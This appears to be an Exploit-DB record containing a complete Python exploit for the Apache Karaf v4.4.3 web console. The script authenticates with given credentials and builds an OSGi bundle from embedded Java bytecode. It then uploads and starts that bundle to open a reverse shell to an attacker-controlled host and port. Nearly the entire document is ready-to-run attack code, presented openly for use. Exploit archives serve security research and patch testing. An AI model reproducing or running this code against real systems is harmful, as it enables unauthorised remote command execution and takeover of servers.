{"source": "https://www.exploit-db.com/exploits/51895", "vulnName": "Karaf v4.4.3 Console - RCE", "vulnEDBID": "51895", "vulnCVE": "N/A", "author": "ANDRZEJ OLCHAWA, MILENKO STARCIK", "exploitType": "WEBAPPS", "platform": "JAVA", "datePublished": "2024-03-16", "vulnContent": "#!/usr/bin/python\n\n# Exploit Title: [Karaf v4.4.3 Console RCE]\n# Date: [2023-08-07]\n# Exploit Author: [Andrzej Olchawa, Milenko Starcik,\n#                  VisionSpace Technologies GmbH]\n# Exploit Repository:\n#           [https://github.com/visionspacetec/offsec-karaf-exploits.git]\n# Vendor Homepage: [https://karaf.apache.org]\n# Software Link: [https://karaf.apache.org/download.html]\n# Version: [4.4.3]\n# Tested on: [Linux kali 6.3.0-kali1-amd64]\n# License: [MIT]\n#\n# Usage:\n# python exploit.py --help\n#\n# Example:\n# python exploit.py --rhost=192.168.0.133 --rport=1337 \\\n#                   --lhost=192.168.0.100 --lport=4444 \\\n#                   --creds=karaf:karaf\n\n\n\"\"\"\nThis tool will let you open a reverse shell from the system\nthat is running Karaf Console\",\n\"\"\"\nimport argparse\nimport base64\nimport io\nimport re\nimport zipfile\nimport requests\n\n# Content of the MANIFEST.MF file.\nMANIFEST_CONTENT = \\\n    \"Bundle-Name: RevShell\\n\" \\\n    \"Bundle-Description: Bundle openning a reverse shell connection.\\n\" \\\n    \"Bundle-SymbolicName: com.visionspace.osgi.revshell.Activator\\n\" \\\n    \"Bundle-Vendor: VisionSpace\\n\" \\\n    \"Bundle-Version: 1.0.0\\n\" \\\n    \"Import-Package: org.osgi.framework\\n\" \\\n    \"Bundle-Activator: com.visionspace.osgi.revshell.Activator\"\n\n# Activator.class bytecode template.\nACTIVATOR_CLASS_BYTECODE_TEMPLATE = \\\n    b\"\\xca\\xfe\\xba\\xbe\\x00\\x00\\x00\\x37\\x00\\x7b\" \\\n    b\"\\x0a\\x00\\x22\\x00\\x33\\x08\\x00\\x34\\x07\\x00\" \\\n    b\"\\x35\\x07\\x00\\x36\\x0a\\x00\\x03\\x00\\x37\\x0a\" \\\n    b\"\\x00\\x03\\x00\\x38\\x0a\\x00\\x03\\x00\\x39\\x07\" \\\n    b\"\\x00\\x3a\\x08\\x00\\x3b\\x08\\x00\\x3c\\x0a\\x00\" \\\n    b\"\\x3d\\x00\\x3e\\x0a\\x00\\x08\\x00\\x3f\\x0a\\x00\" \\\n    b\"\\x2c\\x00\\x40\\x0a\\x00\\x2c\\x00\\x41\\x0a\\x00\" \\\n    b\"\\x08\\x00\\x40\\x0a\\x00\\x2c\\x00\\x42\\x0a\\x00\" \\\n    b\"\\x08\\x00\\x42\\x0a\\x00\\x08\\x00\\x43\\x0a\\x00\" \\\n    b\"\\x2d\\x00\\x44\\x0a\\x00\\x2d\\x00\\x45\\x0a\\x00\" \\\n    b\"\\x2e\\x00\\x46\\x0a\\x00\\x2e\\x00\\x47\\x05\\x00\" \\\n    b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x32\\x0a\\x00\\x48\" \\\n    b\"\\x00\\x49\\x0a\\x00\\x2c\\x00\\x4a\\x07\\x00\\x4b\" \\\n    b\"\\x0a\\x00\\x2c\\x00\\x4c\\x0a\\x00\\x08\\x00\\x4d\" \\\n    b\"\\x09\\x00\\x4e\\x00\\x4f\\x08\\x00\\x50\\x0a\\x00\" \\\n    b\"\\x51\\x00\\x52\\x07\\x00\\x53\\x07\\x00\\x54\\x07\" \\\n    b\"\\x00\\x55\\x01\\x00\\x06\\x3c\\x69\\x6e\\x69\\x74\" \\\n    b\"\\x3e\\x01\\x00\\x03\\x28\\x29\\x56\\x01\\x00\\x04\" \\\n    b\"\\x43\\x6f\\x64\\x65\\x01\\x00\\x0f\\x4c\\x69\\x6e\" \\\n    b\"\\x65\\x4e\\x75\\x6d\\x62\\x65\\x72\\x54\\x61\\x62\" \\\n    b\"\\x6c\\x65\\x01\\x00\\x05\\x73\\x74\\x61\\x72\\x74\" \\\n    b\"\\x01\\x00\\x25\\x28\\x4c\\x6f\\x72\\x67\\x2f\\x6f\" \\\n    b\"\\x73\\x67\\x69\\x2f\\x66\\x72\\x61\\x6d\\x65\\x77\" \\\n    b\"\\x6f\\x72\\x6b\\x2f\\x42\\x75\\x6e\\x64\\x6c\\x65\" \\\n    b\"\\x43\\x6f\\x6e\\x74\\x65\\x78\\x74\\x3b\\x29\\x56\" \\\n    b\"\\x01\\x00\\x0d\\x53\\x74\\x61\\x63\\x6b\\x4d\\x61\" \\\n    b\"\\x70\\x54\\x61\\x62\\x6c\\x65\\x07\\x00\\x56\\x07\" \\\n    b\"\\x00\\x57\\x07\\x00\\x58\\x07\\x00\\x59\\x01\\x00\" \\\n    b\"\\x0a\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\" \\\n    b\"\\x73\\x01\\x00\\x04\\x73\\x74\\x6f\\x70\\x01\\x00\" \\\n    b\"\\x0a\\x53\\x6f\\x75\\x72\\x63\\x65\\x46\\x69\\x6c\" \\\n    b\"\\x65\\x01\\x00\\x0e\\x41\\x63\\x74\\x69\\x76\\x61\" \\\n    b\"\\x74\\x6f\\x72\\x2e\\x6a\\x61\\x76\\x61\\x0c\\x00\" \\\n    b\"\\x24\\x00\\x25\\x01\\x00\\x02\\x73\\x68\\x01\\x00\" \\\n    b\"\\x18\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\" \\\n    b\"\\x2f\\x50\\x72\\x6f\\x63\\x65\\x73\\x73\\x42\\x75\" \\\n    b\"\\x69\\x6c\\x64\\x65\\x72\\x01\\x00\\x10\\x6a\\x61\" \\\n    b\"\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\" \\\n    b\"\\x72\\x69\\x6e\\x67\\x0c\\x00\\x24\\x00\\x5a\\x0c\" \\\n    b\"\\x00\\x5b\\x00\\x5c\\x0c\\x00\\x28\\x00\\x5d\\x01\" \\\n    b\"\\x00\\x0f\\x6a\\x61\\x76\\x61\\x2f\\x6e\\x65\\x74\" \\\n    b\"\\x2f\\x53\\x6f\\x63\\x6b\\x65\\x74\\x01\\x00\\x07\" \\\n    b\"\\x3c\\x4c\\x48\\x4f\\x53\\x54\\x3e\\x01\\x00\\x07\" \\\n    b\"\\x3c\\x4c\\x50\\x4f\\x52\\x54\\x3e\\x07\\x00\\x5e\" \\\n    b\"\\x0c\\x00\\x5f\\x00\\x60\\x0c\\x00\\x24\\x00\\x61\" \\\n    b\"\\x0c\\x00\\x62\\x00\\x63\\x0c\\x00\\x64\\x00\\x63\" \\\n    b\"\\x0c\\x00\\x65\\x00\\x66\\x0c\\x00\\x67\\x00\\x68\" \\\n    b\"\\x0c\\x00\\x69\\x00\\x6a\\x0c\\x00\\x6b\\x00\\x6a\" \\\n    b\"\\x0c\\x00\\x6c\\x00\\x6d\\x0c\\x00\\x6e\\x00\\x25\" \\\n    b\"\\x07\\x00\\x6f\\x0c\\x00\\x70\\x00\\x71\\x0c\\x00\" \\\n    b\"\\x72\\x00\\x6a\\x01\\x00\\x13\\x6a\\x61\\x76\\x61\" \\\n    b\"\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x45\\x78\\x63\\x65\" \\\n    b\"\\x70\\x74\\x69\\x6f\\x6e\\x0c\\x00\\x73\\x00\\x25\" \\\n    b\"\\x0c\\x00\\x74\\x00\\x25\\x07\\x00\\x75\\x0c\\x00\" \\\n    b\"\\x76\\x00\\x77\\x01\\x00\\x1d\\x54\\x68\\x61\\x6e\" \\\n    b\"\\x6b\\x20\\x79\\x6f\\x75\\x20\\x66\\x6f\\x72\\x20\" \\\n    b\"\\x70\\x77\\x6e\\x69\\x6e\\x67\\x20\\x77\\x69\\x74\" \\\n    b\"\\x68\\x20\\x75\\x73\\x21\\x07\\x00\\x78\\x0c\\x00\" \\\n    b\"\\x79\\x00\\x7a\\x01\\x00\\x27\\x63\\x6f\\x6d\\x2f\" \\\n    b\"\\x76\\x69\\x73\\x69\\x6f\\x6e\\x73\\x70\\x61\\x63\" \\\n    b\"\\x65\\x2f\\x6f\\x73\\x67\\x69\\x2f\\x72\\x65\\x76\" \\\n    b\"\\x73\\x68\\x65\\x6c\\x6c\\x2f\\x41\\x63\\x74\\x69\" \\\n    b\"\\x76\\x61\\x74\\x6f\\x72\\x01\\x00\\x10\\x6a\\x61\" \\\n    b\"\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f\\x62\" \\\n    b\"\\x6a\\x65\\x63\\x74\\x01\\x00\\x22\\x6f\\x72\\x67\" \\\n    b\"\\x2f\\x6f\\x73\\x67\\x69\\x2f\\x66\\x72\\x61\\x6d\" \\\n    b\"\\x65\\x77\\x6f\\x72\\x6b\\x2f\\x42\\x75\\x6e\\x64\" \\\n    b\"\\x6c\\x65\\x41\\x63\\x74\\x69\\x76\\x61\\x74\\x6f\" \\\n    b\"\\x72\\x01\\x00\\x20\\x6f\\x72\\x67\\x2f\\x6f\\x73\" \\\n    b\"\\x67\\x69\\x2f\\x66\\x72\\x61\\x6d\\x65\\x77\\x6f\" \\\n    b\"\\x72\\x6b\\x2f\\x42\\x75\\x6e\\x64\\x6c\\x65\\x43\" \\\n    b\"\\x6f\\x6e\\x74\\x65\\x78\\x74\\x01\\x00\\x11\\x6a\" \\\n    b\"\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x50\" \\\n    b\"\\x72\\x6f\\x63\\x65\\x73\\x73\\x01\\x00\\x13\\x6a\" \\\n    b\"\\x61\\x76\\x61\\x2f\\x69\\x6f\\x2f\\x49\\x6e\\x70\" \\\n    b\"\\x75\\x74\\x53\\x74\\x72\\x65\\x61\\x6d\\x01\\x00\" \\\n    b\"\\x14\\x6a\\x61\\x76\\x61\\x2f\\x69\\x6f\\x2f\\x4f\" \\\n    b\"\\x75\\x74\\x70\\x75\\x74\\x53\\x74\\x72\\x65\\x61\" \\\n    b\"\\x6d\\x01\\x00\\x16\\x28\\x5b\\x4c\\x6a\\x61\\x76\" \\\n    b\"\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\" \\\n    b\"\\x69\\x6e\\x67\\x3b\\x29\\x56\\x01\\x00\\x13\\x72\" \\\n    b\"\\x65\\x64\\x69\\x72\\x65\\x63\\x74\\x45\\x72\\x72\" \\\n    b\"\\x6f\\x72\\x53\\x74\\x72\\x65\\x61\\x6d\\x01\\x00\" \\\n    b\"\\x1d\\x28\\x5a\\x29\\x4c\\x6a\\x61\\x76\\x61\\x2f\" \\\n    b\"\\x6c\\x61\\x6e\\x67\\x2f\\x50\\x72\\x6f\\x63\\x65\" \\\n    b\"\\x73\\x73\\x42\\x75\\x69\\x6c\\x64\\x65\\x72\\x3b\" \\\n    b\"\\x01\\x00\\x15\\x28\\x29\\x4c\\x6a\\x61\\x76\\x61\" \\\n    b\"\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x50\\x72\\x6f\\x63\" \\\n    b\"\\x65\\x73\\x73\\x3b\\x01\\x00\\x11\\x6a\\x61\\x76\" \\\n    b\"\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x49\\x6e\\x74\" \\\n    b\"\\x65\\x67\\x65\\x72\\x01\\x00\\x08\\x70\\x61\\x72\" \\\n    b\"\\x73\\x65\\x49\\x6e\\x74\\x01\\x00\\x15\\x28\\x4c\" \\\n    b\"\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\" \\\n    b\"\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x29\\x49\\x01\" \\\n    b\"\\x00\\x16\\x28\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\" \\\n    b\"\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\" \\\n    b\"\\x3b\\x49\\x29\\x56\\x01\\x00\\x0e\\x67\\x65\\x74\" \\\n    b\"\\x49\\x6e\\x70\\x75\\x74\\x53\\x74\\x72\\x65\\x61\" \\\n    b\"\\x6d\\x01\\x00\\x17\\x28\\x29\\x4c\\x6a\\x61\\x76\" \\\n    b\"\\x61\\x2f\\x69\\x6f\\x2f\\x49\\x6e\\x70\\x75\\x74\" \\\n    b\"\\x53\\x74\\x72\\x65\\x61\\x6d\\x3b\\x01\\x00\\x0e\" \\\n    b\"\\x67\\x65\\x74\\x45\\x72\\x72\\x6f\\x72\\x53\\x74\" \\\n    b\"\\x72\\x65\\x61\\x6d\\x01\\x00\\x0f\\x67\\x65\\x74\" \\\n    b\"\\x4f\\x75\\x74\\x70\\x75\\x74\\x53\\x74\\x72\\x65\" \\\n    b\"\\x61\\x6d\\x01\\x00\\x18\\x28\\x29\\x4c\\x6a\\x61\" \\\n    b\"\\x76\\x61\\x2f\\x69\\x6f\\x2f\\x4f\\x75\\x74\\x70\" \\\n    b\"\\x75\\x74\\x53\\x74\\x72\\x65\\x61\\x6d\\x3b\\x01\" \\\n    b\"\\x00\\x08\\x69\\x73\\x43\\x6c\\x6f\\x73\\x65\\x64\" \\\n    b\"\\x01\\x00\\x03\\x28\\x29\\x5a\\x01\\x00\\x09\\x61\" \\\n    b\"\\x76\\x61\\x69\\x6c\\x61\\x62\\x6c\\x65\\x01\\x00\" \\\n    b\"\\x03\\x28\\x29\\x49\\x01\\x00\\x04\\x72\\x65\\x61\" \\\n    b\"\\x64\\x01\\x00\\x05\\x77\\x72\\x69\\x74\\x65\\x01\" \\\n    b\"\\x00\\x04\\x28\\x49\\x29\\x56\\x01\\x00\\x05\\x66\" \\\n    b\"\\x6c\\x75\\x73\\x68\\x01\\x00\\x10\\x6a\\x61\\x76\" \\\n    b\"\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x54\\x68\\x72\" \\\n    b\"\\x65\\x61\\x64\\x01\\x00\\x05\\x73\\x6c\\x65\\x65\" \\\n    b\"\\x70\\x01\\x00\\x04\\x28\\x4a\\x29\\x56\\x01\\x00\" \\\n    b\"\\x09\\x65\\x78\\x69\\x74\\x56\\x61\\x6c\\x75\\x65\" \\\n    b\"\\x01\\x00\\x07\\x64\\x65\\x73\\x74\\x72\\x6f\\x79\" \\\n    b\"\\x01\\x00\\x05\\x63\\x6c\\x6f\\x73\\x65\\x01\\x00\" \\\n    b\"\\x10\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\" \\\n    b\"\\x2f\\x53\\x79\\x73\\x74\\x65\\x6d\\x01\\x00\\x03\" \\\n    b\"\\x6f\\x75\\x74\\x01\\x00\\x15\\x4c\\x6a\\x61\\x76\" \\\n    b\"\\x61\\x2f\\x69\\x6f\\x2f\\x50\\x72\\x69\\x6e\\x74\" \\\n    b\"\\x53\\x74\\x72\\x65\\x61\\x6d\\x3b\\x01\\x00\\x13\" \\\n    b\"\\x6a\\x61\\x76\\x61\\x2f\\x69\\x6f\\x2f\\x50\\x72\" \\\n    b\"\\x69\\x6e\\x74\\x53\\x74\\x72\\x65\\x61\\x6d\\x01\" \\\n    b\"\\x00\\x07\\x70\\x72\\x69\\x6e\\x74\\x6c\\x6e\\x01\" \\\n    b\"\\x00\\x15\\x28\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\" \\\n    b\"\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\" \\\n    b\"\\x3b\\x29\\x56\\x00\\x21\\x00\\x21\\x00\\x22\\x00\" \\\n    b\"\\x01\\x00\\x23\\x00\\x00\\x00\\x03\\x00\\x01\\x00\" \\\n    b\"\\x24\\x00\\x25\\x00\\x01\\x00\\x26\\x00\\x00\\x00\" \\\n    b\"\\x1d\\x00\\x01\\x00\\x01\\x00\\x00\\x00\\x05\\x2a\" \\\n    b\"\\xb7\\x00\\x01\\xb1\\x00\\x00\\x00\\x01\\x00\\x27\" \\\n    b\"\\x00\\x00\\x00\\x06\\x00\\x01\\x00\\x00\\x00\\x0a\" \\\n    b\"\\x00\\x01\\x00\\x28\\x00\\x29\\x00\\x02\\x00\\x26\" \\\n    b\"\\x00\\x00\\x01\\x6e\\x00\\x06\\x00\\x0b\\x00\\x00\" \\\n    b\"\\x00\\xb8\\x12\\x02\\x4d\\xbb\\x00\\x03\\x59\\x04\" \\\n    b\"\\xbd\\x00\\x04\\x59\\x03\\x2c\\x53\\xb7\\x00\\x05\" \\\n    b\"\\x04\\xb6\\x00\\x06\\xb6\\x00\\x07\\x4e\\xbb\\x00\" \\\n    b\"\\x08\\x59\\x12\\x09\\x12\\x0a\\xb8\\x00\\x0b\\xb7\" \\\n    b\"\\x00\\x0c\\x3a\\x04\\x2d\\xb6\\x00\\x0d\\x3a\\x05\" \\\n    b\"\\x2d\\xb6\\x00\\x0e\\x3a\\x06\\x19\\x04\\xb6\\x00\" \\\n    b\"\\x0f\\x3a\\x07\\x2d\\xb6\\x00\\x10\\x3a\\x08\\x19\" \\\n    b\"\\x04\\xb6\\x00\\x11\\x3a\\x09\\x19\\x04\\xb6\\x00\" \\\n    b\"\\x12\\x9a\\x00\\x5f\\x19\\x05\\xb6\\x00\\x13\\x9e\" \\\n    b\"\\x00\\x10\\x19\\x09\\x19\\x05\\xb6\\x00\\x14\\xb6\" \\\n    b\"\\x00\\x15\\xa7\\xff\\xee\\x19\\x06\\xb6\\x00\\x13\" \\\n    b\"\\x9e\\x00\\x10\\x19\\x09\\x19\\x06\\xb6\\x00\\x14\" \\\n    b\"\\xb6\\x00\\x15\\xa7\\xff\\xee\\x19\\x07\\xb6\\x00\" \\\n    b\"\\x13\\x9e\\x00\\x10\\x19\\x08\\x19\\x07\\xb6\\x00\" \\\n    b\"\\x14\\xb6\\x00\\x15\\xa7\\xff\\xee\\x19\\x09\\xb6\" \\\n    b\"\\x00\\x16\\x19\\x08\\xb6\\x00\\x16\\x14\\x00\\x17\" \\\n    b\"\\xb8\\x00\\x19\\x2d\\xb6\\x00\\x1a\\x57\\xa7\\x00\" \\\n    b\"\\x08\\x3a\\x0a\\xa7\\xff\\x9f\\x2d\\xb6\\x00\\x1c\" \\\n    b\"\\x19\\x04\\xb6\\x00\\x1d\\xb1\\x00\\x01\\x00\\xa1\" \\\n    b\"\\x00\\xa6\\x00\\xa9\\x00\\x1b\\x00\\x02\\x00\\x27\" \\\n    b\"\\x00\\x00\\x00\\x66\\x00\\x19\\x00\\x00\\x00\\x0c\" \\\n    b\"\\x00\\x03\\x00\\x0e\\x00\\x1a\\x00\\x0f\\x00\\x2a\" \\\n    b\"\\x00\\x10\\x00\\x30\\x00\\x11\\x00\\x36\\x00\\x12\" \\\n    b\"\\x00\\x3d\\x00\\x13\\x00\\x43\\x00\\x14\\x00\\x4a\" \\\n    b\"\\x00\\x15\\x00\\x52\\x00\\x16\\x00\\x5a\\x00\\x17\" \\\n    b\"\\x00\\x67\\x00\\x18\\x00\\x6f\\x00\\x19\\x00\\x7c\" \\\n    b\"\\x00\\x1a\\x00\\x84\\x00\\x1b\\x00\\x91\\x00\\x1c\" \\\n    b\"\\x00\\x96\\x00\\x1d\\x00\\x9b\\x00\\x1e\\x00\\xa1\" \\\n    b\"\\x00\\x20\\x00\\xa6\\x00\\x21\\x00\\xa9\\x00\\x22\" \\\n    b\"\\x00\\xab\\x00\\x23\\x00\\xae\\x00\\x25\\x00\\xb2\" \\\n    b\"\\x00\\x26\\x00\\xb7\\x00\\x27\\x00\\x2a\\x00\\x00\" \\\n    b\"\\x00\\x30\\x00\\x07\\xff\\x00\\x4a\\x00\\x0a\\x07\" \\\n    b\"\\x00\\x21\\x07\\x00\\x2b\\x07\\x00\\x04\\x07\\x00\" \\\n    b\"\\x2c\\x07\\x00\\x08\\x07\\x00\\x2d\\x07\\x00\\x2d\" \\\n    b\"\\x07\\x00\\x2d\\x07\\x00\\x2e\\x07\\x00\\x2e\\x00\" \\\n    b\"\\x00\\x07\\x14\\x14\\x14\\x57\\x07\\x00\\x1b\\x04\" \\\n    b\"\\x00\\x2f\\x00\\x00\\x00\\x04\\x00\\x01\\x00\\x1b\" \\\n    b\"\\x00\\x01\\x00\\x30\\x00\\x29\\x00\\x02\\x00\\x26\" \\\n    b\"\\x00\\x00\\x00\\x25\\x00\\x02\\x00\\x02\\x00\\x00\" \\\n    b\"\\x00\\x09\\xb2\\x00\\x1e\\x12\\x1f\\xb6\\x00\\x20\" \\\n    b\"\\xb1\\x00\\x00\\x00\\x01\\x00\\x27\\x00\\x00\\x00\" \\\n    b\"\\x0a\\x00\\x02\\x00\\x00\\x00\\x2a\\x00\\x08\\x00\" \\\n    b\"\\x2b\\x00\\x2f\\x00\\x00\\x00\\x04\\x00\\x01\\x00\" \\\n    b\"\\x1b\\x00\\x01\\x00\\x31\\x00\\x00\\x00\\x02\\x00\" \\\n    b\"\\x32\"\n\n# Items to be replaces within the bytecode of Activator.class\n# <LEN><LHOST> = <\\x07><\\x3c\\x4c\\x48\\x4f\\x53\\x54\\x3e>\nACTIVATOR_CLASS_LHOST_TAG = b\"\\x07\\x3c\\x4c\\x48\\x4f\\x53\\x54\\x3e\"\n# <LEN><LPORT> = <\\x07><\\x3c\\x4c\\x50\\x4f\\x52\\x54\\x3e>\nACTIVATOR_CLASS_LPORT_TAG = b\"\\x07\\x3c\\x4c\\x50\\x4f\\x52\\x54\\x3e\"\n\n\ndef parse():\n    \"\"\"\n    This function parses the command-line arguments.\n    \"\"\"\n\n    parser = argparse.ArgumentParser(\n        prog=\"Karaf-Console-RCE\",\n        description=\"This tool will let you open a reverse shell from the \"\n                    \"system that is running Karaf Console\",\n        epilog=\"Happy Hacking! :)\",\n    )\n\n    parser.add_argument(\"--rhost\", dest=\"rhost\",\n                        help=\"remote host\", type=str, required=True)\n    parser.add_argument(\"--rport\", dest=\"rport\",\n                        help=\"remote port\", type=int, required=True)\n    parser.add_argument(\"--lhost\", dest=\"lhost\",\n                        help=\"local host\", type=str, required=True)\n    parser.add_argument(\"--lport\", dest=\"lport\",\n                        help=\"local port\", type=int, required=True)\n    parser.add_argument(\"--creds\", dest=\"creds\",\n                        help=\"credentials in format <username:password>\",\n                        type=str, required=True)\n    parser.add_argument(\"--version\", action=\"version\",\n                        version=\"%(prog)s 0.1.0\")\n\n    return parser.parse_args()\n\n\ndef extract_jsessionid(cookie):\n    \"\"\"\n    This function extracts the JSESSIONID from the cookie string.\n    \"\"\"\n\n    jsessionid = None\n\n    regex = re.findall(\"JSESSIONID=([^;]+)\", cookie)\n    if len(regex) > 0:\n        jsessionid = regex[0]\n\n    return jsessionid\n\n\ndef authenticate(target, basic_auth):\n    \"\"\"\n    This function connects to the URL and retrieves the JSESSIONID\n    based on the Basic Authorization.\n    \"\"\"\n\n    jsessionid = None\n\n    headers = {\n        \"Authorization\": basic_auth\n    }\n\n    response = requests.get(target, headers=headers,\n                            allow_redirects=False, timeout=10)\n\n    if (response.status_code == 302 and response.headers[\"Set-Cookie\"]):\n        jsessionid = extract_jsessionid(response.headers[\"Set-Cookie\"])\n\n    return jsessionid\n\n\ndef generate_payload(lhost, lport):\n    \"\"\"\n    This function generates the payload.\n    It replaces the template payload with the `lhost` and `lport` arguments.\n    \"\"\"\n\n    payload = None\n\n    lhost_byte_array = bytearray()\n    lhost_byte_array.append(len(lhost))\n    lhost_byte_array.extend(map(ord, lhost))\n\n    activator_class_bytecodes = ACTIVATOR_CLASS_BYTECODE_TEMPLATE.replace(\n        ACTIVATOR_CLASS_LHOST_TAG, lhost_byte_array)\n\n    lport_str = str(lport)\n    lport_byte_array = bytearray()\n    lport_byte_array.append(len(lport_str))\n    lport_byte_array.extend(map(ord, lport_str))\n\n    activator_class_bytecodes = activator_class_bytecodes.replace(\n        ACTIVATOR_CLASS_LPORT_TAG, lport_byte_array)\n\n    jar_bytes = io.BytesIO()\n\n    with zipfile.ZipFile(jar_bytes, \"w\", zipfile.ZIP_DEFLATED) as zip_file:\n        zip_file.writestr(\"com/visionspace/osgi/revshell/Activator.class\",\n                          activator_class_bytecodes)\n        zip_file.writestr(\"META-INF/MANIFEST.MF\", MANIFEST_CONTENT)\n\n    payload = jar_bytes.getvalue()\n\n    return payload\n\n\ndef deploy_payload(target, basic_auth, jsessionid, payload):\n    \"\"\"\n    This function connects to the Karaf Console and deployes the payload.\n    \"\"\"\n\n    success = False\n\n    url = f\"{target}/bundles\"\n\n    cookies = {\n        \"JSESSIONID\": jsessionid\n    }\n\n    headers = {\n        \"Authorization\": basic_auth\n    }\n\n    files = {\n        \"bundlefile\": (\n            \"revshell.jar\", payload, \"application/x-java-archive\")\n    }\n\n    data = {\n        \"action\": \"install\",\n        \"bundlestart\": \"start\",\n        \"bundlestartlevel\": 80\n    }\n\n    response = requests.post(url, headers=headers, cookies=cookies,\n                             files=files, data=data, timeout=10,\n                             allow_redirects=False)\n\n    if response.status_code == 302:\n        success = True\n\n    return success\n\n\ndef generate_basic_auth(creds):\n    \"\"\"\n    This function generates the Basic Authorization string based\n    on the credentials.\n    \"\"\"\n\n    creds_base64 = base64.b64encode(creds.encode()).decode()\n    basic_auth = f\"Basic {creds_base64}\"\n\n    return basic_auth\n\n\ndef create_target_url(rhost, rport):\n    \"\"\"\n    This function creates a target URL.\n    \"\"\"\n\n    target_url = f\"http://{rhost}:{rport}/system/console\"\n\n    return target_url\n\n\ndef main(args):\n    \"\"\"\n    Main function.\n    \"\"\"\n\n    target = create_target_url(args.rhost, args.rport)\n\n    print(\"[*] Login...\")\n    basic_auth = generate_basic_auth(args.creds)\n    jsessionid = authenticate(target, basic_auth)\n\n    if jsessionid:\n        print(\"[+] Session established.\")\n\n        print(\"[*] Generating payload...\")\n        payload = generate_payload(args.lhost, args.lport)\n\n        if payload:\n            print(\"[*] Deploying payload...\")\n            if deploy_payload(target, basic_auth, jsessionid, payload):\n                print(\"[+] Done.\")\n            else:\n                print(\"[-] Failed to deploy the payload!\")\n        else:\n            print(\"[-] Failed to generate the payload!\")\n    else:\n        print(\"[-] Login failed!\")\n\n\nif __name__ == \"__main__\":\n    main(parse())\n            "}